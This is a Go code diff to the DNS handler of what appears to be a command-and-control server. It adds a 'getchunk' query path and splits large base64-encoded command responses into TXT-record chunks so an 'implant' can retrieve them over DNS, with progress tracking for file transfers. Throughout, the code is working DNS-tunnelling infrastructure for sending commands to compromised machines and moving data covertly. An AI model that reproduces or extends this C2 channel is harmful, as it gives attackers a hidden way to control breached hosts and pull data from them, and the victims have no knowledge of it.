@@ -93,6 +93,52 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 
 	subdomain := labels[0]
 
+	// Check if this is a chunk request from implant (format: "getchunk-sessionID-chunkIndex")
+	if strings.HasPrefix(subdomain, "getchunk-") {
+		parts := strings.SplitN(subdomain, "-", 3)
+		if len(parts) == 3 {
+			sessionID, _ := strconv.Atoi(parts[1])
+			chunkIndex, _ := strconv.Atoi(parts[2])
+			
+			core.ResponseChunksMutex.RLock()
+			respChunk, exists := core.ResponseChunks[sessionID]
+			core.ResponseChunksMutex.RUnlock()
+			
+			if exists && chunkIndex > 0 && chunkIndex < len(respChunk.Chunks)+1 {
+				// Return the requested chunk in format: totalChunks-chunkIndex-chunkData
+				chunkData := respChunk.Chunks[chunkIndex-1]
+				chunkResp := fmt.Sprintf("%d-%d-%s", respChunk.TotalChunks, chunkIndex, chunkData)
+				
+				rr := &dns.TXT{
+					Hdr: dns.RR_Header{
+						Name:   q.Name,
+						Rrtype: dns.TypeTXT,
+						Class:  dns.ClassINET,
+						Ttl:    60,
+					},
+					Txt: []string{chunkResp},
+				}
+				msg.Answer = append(msg.Answer, rr)
+				w.WriteMsg(msg)
+				
+				// Track this chunk as acknowledged for progress reporting
+				go core.AckFileChunk(sessionID, chunkIndex)
+				
+				// If this was the last chunk, clean up
+				if chunkIndex == len(respChunk.Chunks) {
+					core.ResponseChunksMutex.Lock()
+					delete(core.ResponseChunks, sessionID)
+					core.ResponseChunksMutex.Unlock()
+					log.Printf("Cleaned up response chunks for session %d after final chunk sent", sessionID)
+				}
+				return
+			}
+		}
+		// Chunk not found, return empty response
+		w.WriteMsg(msg)
+		return
+	}
+
 	// Parse chunk metadata: sessionID-chunkIndex-totalChunks-chunkPayloadBase64
 	parts := strings.SplitN(subdomain, "-", 4)
 	if len(parts) != 4 {
@@ -140,11 +186,9 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 		// Lock session mutex to safely update fragments (narrow scope)
 		sessionsMu.Lock()
 
-		// Ensure SubDomainFragments slice is properly sized in the session
-		if len(session.SubDomainFragments) < totalChunks {
-			frags := make([]string, totalChunks)
-			copy(frags, session.SubDomainFragments)
-			session.SubDomainFragments = frags
+		// If totalChunks changed (new message), clear the old buffer completely
+		if len(session.SubDomainFragments) != totalChunks {
+			session.SubDomainFragments = make([]string, totalChunks)
 		}
 
 		// Store chunk at the correct index in the session
@@ -504,7 +548,6 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 		"cmd":  cmd,
 	}
 
-
 	jsonResp, err := json.Marshal(response)
 
 	encodedJsonResp := base64.RawURLEncoding.EncodeToString([]byte(jsonResp))
@@ -518,6 +561,71 @@ func DNSServerHandler(w dns.ResponseWriter, r *dns.Msg) {
 	core.UpdateImplant(dnsParams.SessionID, dnsParams.Update, dnsParams.ImplantArch, additionalFunctions)
 	core.SessionCheckIn(dnsParams.SessionID,"DNS")
 
+	// Chunk response if it's too large for a single DNS response (> 200 chars is safer than 255)
+	const maxResponseSize = 200
+	if len(encodedJsonResp) > maxResponseSize {
+		// Response is large, chunk it for the implant to reassemble
+		chunks := make([]string, 0)
+		for i := 0; i < len(encodedJsonResp); i += maxResponseSize {
+			end := i + maxResponseSize
+			if end > len(encodedJsonResp) {
+				end = len(encodedJsonResp)
+			}
+			chunks = append(chunks, encodedJsonResp[i:end])
+		}
+
+		// Send first chunk with metadata: totalChunks-chunkIndex-chunkData
+		totalChunks := len(chunks)
+		firstChunkResp := fmt.Sprintf("%d-0-%s", totalChunks, chunks[0])
+		
+		rr := &dns.TXT{
+			Hdr: dns.RR_Header{
+				Name:   q.Name,
+				Rrtype: dns.TypeTXT,
+				Class:  dns.ClassINET,
+				Ttl:    60,
+			},
+			Txt: []string{firstChunkResp},
+		}
+		msg.Answer = append(msg.Answer, rr)
+		w.WriteMsg(msg)
+		
+		log.Printf("Sending chunked response (chunk 0/%d) for session %d", totalChunks-1, dnsParams.SessionID)
+
+		// Store remaining chunks in a server-side buffer for this session
+		// Implant will query for remaining chunks
+		core.ResponseChunksMutex.Lock()
+		core.ResponseChunks[dnsParams.SessionID] = core.ResponseChunk{
+			Chunks:      chunks[1:],
+			TotalChunks: totalChunks,
+			Timestamp:   time.Now(),
+		}
+		core.ResponseChunksMutex.Unlock()
+		
+		// Initialize file transfer tracking for progress reporting
+		// Always start fresh transfer tracking for new responses
+		core.FileTransfersMutex.Lock()
+		// Clean up any previous transfer for this session
+		delete(core.FileTransfers, dnsParams.SessionID)
+		core.FileTransfersMutex.Unlock()
+		
+		// Start new transfer tracking
+		totalChunksTracked := core.StartFileTransfer(dnsParams.SessionID, encodedJsonResp, maxResponseSize)
+		
+		// Mark chunk 0 (first chunk) as acknowledged since we just sent it
+		core.AckFileChunk(dnsParams.SessionID, 0)
+		
+		progressMsg := fmt.Sprintf("[Session %d] File Transfer Started: 0%% (0/%d chunks)", dnsParams.SessionID, totalChunksTracked)
+		core.LogData(progressMsg)
+		log.Printf(progressMsg)
+		
+		core.LogData(fmt.Sprintf("Buffered %d response chunks for session %d", len(chunks)-1, dnsParams.SessionID))
+		log.Printf("Session %d response chunked into %d parts", dnsParams.SessionID, totalChunks)
+		
+		return
+	}
+
+	// Normal single-response case
 	rr := &dns.TXT{
 		Hdr: dns.RR_Header{
 			Name:   q.Name,
